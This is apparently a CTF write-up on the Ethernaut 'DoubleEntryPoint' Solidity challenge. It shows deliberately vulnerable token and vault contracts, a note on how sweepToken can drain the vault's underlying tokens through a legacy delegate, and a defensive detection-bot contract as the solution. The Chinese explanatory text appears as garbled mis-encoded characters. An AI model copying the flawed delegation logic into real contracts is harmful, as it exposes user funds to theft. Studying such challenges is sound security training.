<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span><span class="p">;</span>

<span class="kr">interface</span><span class="w"> </span><span class="nx">DelegateERC20</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">delegateTransfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">origSender</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">);</span>
<span class="p">}</span>

<span class="kr">interface</span><span class="w"> </span><span class="nx">IDetectionBot</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">handleTransaction</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">user</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">msgData</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
<span class="p">}</span>

<span class="kr">interface</span><span class="w"> </span><span class="nx">IForta</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setDetectionBot</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">detectionBotAddress</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">notify</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">user</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">msgData</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">raiseAlert</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">user</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Forta</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">IForta</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">IDetectionBot</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">usersDetectionBots</span><span class="p">;</span>
<span class="w">  </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">botRaisedAlerts</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setDetectionBot</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">detectionBotAddress</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">usersDetectionBots</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IDetectionBot</span><span class="p">(</span><span class="nx">detectionBotAddress</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">notify</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">user</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">msgData</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">usersDetectionBots</span><span class="p">[</span><span class="nx">user</span><span class="p">])</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">))</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="nx">usersDetectionBots</span><span class="p">[</span><span class="nx">user</span><span class="p">].</span><span class="nx">handleTransaction</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span><span class="w"> </span><span class="nx">msgData</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">{}</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">raiseAlert</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">user</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">usersDetectionBots</span><span class="p">[</span><span class="nx">user</span><span class="p">])</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
<span class="w">      </span><span class="nx">botRaisedAlerts</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">CryptoVault</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">sweptTokensRecipient</span><span class="p">;</span><span class="w">  </span><span class="c1">// player</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">underlying</span><span class="p">;</span><span class="w"> </span><span class="c1">// DoubleEntryPoint</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">recipient</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">sweptTokensRecipient</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">recipient</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUnderlying</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">latestToken</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">underlying</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;Already set&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">underlying</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">latestToken</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="cm">/*</span>
<span class="cm">    ...</span>
<span class="cm">    */</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">sweepToken</span><span class="p">(</span><span class="nx">IERC20</span><span class="w"> </span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">token</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">underlying</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Can&#39;t transfer underlying token&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">sweptTokensRecipient</span><span class="p">,</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">LegacyToken</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC20</span><span class="p">(</span><span class="s2">&quot;LegacyToken&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LGT&quot;</span><span class="p">),</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">DelegateERC20</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">delegate</span><span class="p">;</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">mint</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">delegateToNewContract</span><span class="p">(</span><span class="nx">DelegateERC20</span><span class="w"> </span><span class="nx">newContract</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">delegate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newContract</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">delegate</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="k">super</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">delegate</span><span class="p">.</span><span class="nx">delegateTransfer</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">DoubleEntryPoint</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC20</span><span class="p">(</span><span class="s2">&quot;DoubleEntryPointToken&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;DET&quot;</span><span class="p">),</span><span class="w"> </span><span class="nx">DelegateERC20</span><span class="p">,</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">cryptoVault</span><span class="p">;</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">player</span><span class="p">;</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">delegatedFrom</span><span class="p">;</span>
<span class="w">    </span><span class="nx">Forta</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">forta</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">legacyToken</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">vaultAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">fortaAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">playerAddress</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">delegatedFrom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">legacyToken</span><span class="p">;</span>
<span class="w">        </span><span class="nx">forta</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Forta</span><span class="p">(</span><span class="nx">fortaAddress</span><span class="p">);</span>
<span class="w">        </span><span class="nx">player</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">playerAddress</span><span class="p">;</span>
<span class="w">        </span><span class="nx">cryptoVault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vaultAddress</span><span class="p">;</span>
<span class="w">        </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">cryptoVault</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyDelegateFrom</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">delegatedFrom</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Not legacy contract&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">fortaNotify</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">detectionBot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">forta</span><span class="p">.</span><span class="nx">usersDetectionBots</span><span class="p">(</span><span class="nx">player</span><span class="p">));</span>

<span class="w">        </span><span class="c1">// Cache old number of bot alerts</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">previousValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">forta</span><span class="p">.</span><span class="nx">botRaisedAlerts</span><span class="p">(</span><span class="nx">detectionBot</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Notify Forta</span>
<span class="w">        </span><span class="nx">forta</span><span class="p">.</span><span class="nx">notify</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Continue execution</span>
<span class="w">        </span><span class="nx">_</span><span class="p">;</span>

<span class="w">        </span><span class="c1">// Check if alarms have been raised</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">forta</span><span class="p">.</span><span class="nx">botRaisedAlerts</span><span class="p">(</span><span class="nx">detectionBot</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">previousValue</span><span class="p">)</span><span class="w"> </span><span class="nx">revert</span><span class="p">(</span><span class="s2">&quot;Alert has been triggered, reverting&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">delegateTransfer</span><span class="p">(</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">origSender</span>
<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="nx">onlyDelegateFrom</span><span class="w"> </span><span class="nx">fortaNotify</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_transfer</span><span class="p">(</span><span class="nx">origSender</span><span class="p">,</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>‰º†ÂÖ• <code>CryptoVault.sweepToken()</code> ‰ª£Â∏ÅÁöÑÂú∞ÂùÄ‰∏çËÉΩÁ≠â‰∫é <code>underlying</code>ÔºåËÄåËã•‰º†ÂÖ• <code>LegacyToken</code> ÁöÑÂú∞ÂùÄÔºåÂ∞ÜË∞ÉÁî® <code>delegateTransfer</code>ÔºåÂÆûÈôÖËΩ¨ÁßªÁöÑÊòØ <code>CryptoVault</code> ÊåÅÊúâÁöÑ <code>DET</code> ‰ª£Â∏ÅÔºåÂØπÂ∫î <code>underlying</code></li>
<li>
<p>Ëã• <code>origSender</code> ‰∏∫ <code>CryptoVault</code> ÁöÑÂÆû‰æãÂàô <code>raiseAlert</code></p>
<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">DetectionBot</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">IDetectionBot</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="nx">vault</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">DoubleEntryPoint</span><span class="w"> </span><span class="nx">dep</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">DoubleEntryPoint</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="nx">vault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dep</span><span class="p">.</span><span class="nx">cryptoVault</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">handleTransaction</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">user</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">msgData</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// skip the 4-byte function signature</span>
<span class="w">    </span><span class="p">(</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">decode</span><span class="p">(</span><span class="nx">msgData</span><span class="p">[</span><span class="mf">4</span><span class="o">:</span><span class="p">],</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">));</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">vault</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">IForta</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">raiseAlert</span><span class="p">(</span><span class="nx">user</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>ÈÉ®ÁΩ≤ <code>DetectionBot</code> ÂêéÔºå‰ΩøÁî® <code>player</code> Ë¥¶Êà∑Ë∞ÉÁî® <code>Forta.setDetectionBot()</code></p>
</li>
<li>ÂèØ‰ª•Âú® <code>sweepToken()</code> ÁöÑÊúÄÂêéÊ£ÄÊü•ÂêàÁ∫¶ <code>underlying</code> ÁöÑ‰ΩôÈ¢ùÊòØÂê¶ÂíåË∞ÉÁî®ÂâçÁõ∏Âêå</li>
</ul>
<h3 id="_17">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://solidity-by-example.org/abi-decode/">ABI Decode | Solidity by Example</a></li>
<li><a href="https://github.com/ethereum/solidity/issues/6012">abi.decode cannot decode <code>msg.data</code> ¬∑ Issue #6012 ¬∑ ethereum/solidity</a></li>
<li><a href="https://medium.com/chainsecurity/trueusd-compound-vulnerability-bc5b696d29e2">TrueUSD ‚Üî Compound Vulnerability | by ChainSecurity | ChainSecurity | Medium</a></li>
</ul>

  <hr>
<div class="md-source-file">
  <small>
    
      ÊúÄÂêéÊõ¥Êñ∞:
      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023Âπ¥3Êúà4Êó• 21:27:06</span>
      
    
  </small>
</div>

              

  
    <div class="md-source-date">
      <small>
          <span class="twemoji">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M5.5 3.5a2 2 0 1 0 0 4 2 2 0 0 0 0-4zM2 5.5a3.5 3.5 0 1 1 5.898 2.549 5.507 5.507 0 0 1 3.034 4.084.75.75 0 1 1-1.482.235 4.001 4.001 0 0 0-7.9 0 .75.75 0 0 1-1.482-.236A5.507 5.507 0 0 1 3.102 8.05 3.49 3.49 0 0 1 2 5.5zM11 4a.75.75 0 1 0 0 1.5 1.5 1.5 0 0 1 .666 2.844.75.75 0 0 0-.416.672v.352a.75.75 0 0 0 .574.73c1.2.289 2.162 1.2 2.522 2.372a.75.75 0 1 0 1.434-.44 5.01 5.01 0 0 0-2.56-3.012A3 3 0 0 0 11 4z"/></svg> 
          </span>
          Contributors: <span class='git-page-authors git-authors'><a href='mailto:137126578@qq.com'>YanhuiJessica</a></span>
      </small>
      <br>
      <small>
          <span id="busuanzi_container_page_pv">
            <span class="twemoji">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0 8a5 5 0 0 1-5-5 5 5 0 0 1 5-5 5 5 0 0 1 5 5 5 5 0 0 1-5 5m0-12.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5Z"/></svg>
            </span>
            Pageviews: <span id="busuanzi_value_page_pv"></span>
          </span>
      </small>
    </div>
  
  
  <!-- Giscus -->
  <h2 id="__comments">ËØÑËÆ∫</h2>
  <script src="https://giscus.app/client.js"
      data-repo="YanhuiJessica/Chictf-Writeups"
      data-repo-id="MDEwOlJlcG9zaXRvcnkyNDg1MTU1OTc="
      data-category="General"
      data-category-id="DIC_kwDODtAMDc4CP_N3"
      data-mapping="title"
      data-reactions-enabled="1"
      data-emit-metadata="0"
      data-input-position="top"
      data-theme="light"
      data-lang="zh-CN"
      data-loading="lazy"
      crossorigin="anonymous"
      async>
  </script>

  <!-- Synchronize Giscus theme with palette -->
  <script>
    var giscus = document.querySelector("script[src*=giscus]")

    /* Set palette on initial load */
    var palette = __md_get("__palette")
    if (palette && typeof palette.color === "object") {
      var theme = palette.color.scheme === "slate" ? "dark" : "light"
      giscus.setAttribute("data-theme", theme)
    }

    /* Register event handlers after documented loaded */
    document.addEventListener("DOMContentLoaded", function() {
      var ref = document.querySelector("[data-md-component=palette]")
      ref.addEventListener("change", function() {
        var palette = __md_get("__palette")
        if (palette && typeof palette.color === "object") {
          var theme = palette.color.scheme === "slate" ? "dark" : "light"

          /* Instruct Giscus to change theme */
          var frame = document.querySelector(".giscus-frame")
          frame.contentWindow.postMessage(
            { giscus: { setConfig: { theme } } },
            "https://giscus.app"
          )
        }
      })
    })
  </script>

            </article>
            
          </div>
        </div>
        
          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
            ÂõûÂà∞È°µÈù¢È°∂ÈÉ®
          </a>
        
      </main>
      
        <footer class="md-footer">
  
    
    <nav class="md-footer__inner md-grid" aria-label="È°µËÑö" >
      
        
        <a href="../protostar/final/" class="md-footer__link md-footer__link--prev" aria-label="‰∏ä‰∏ÄÈ°µ: Final" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                ‰∏ä‰∏ÄÈ°µ
              </span>
              Final
            </div>
          </div>
        </a>
      
      
        
        <a href="../solana_pathway/" class="md-footer__link md-footer__link--next" aria-label="‰∏ã‰∏ÄÈ°µ: Solana Pathway" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                ‰∏ã‰∏ÄÈ°µ
              </span>
              Solana Pathway
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2020 - 2022 YanhuiJessica
    </div>
  
  
</div>
      
        <div class="md-social">
  
    
    
      
      
    
    <a href="https://github.com/YanhuiJessica" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
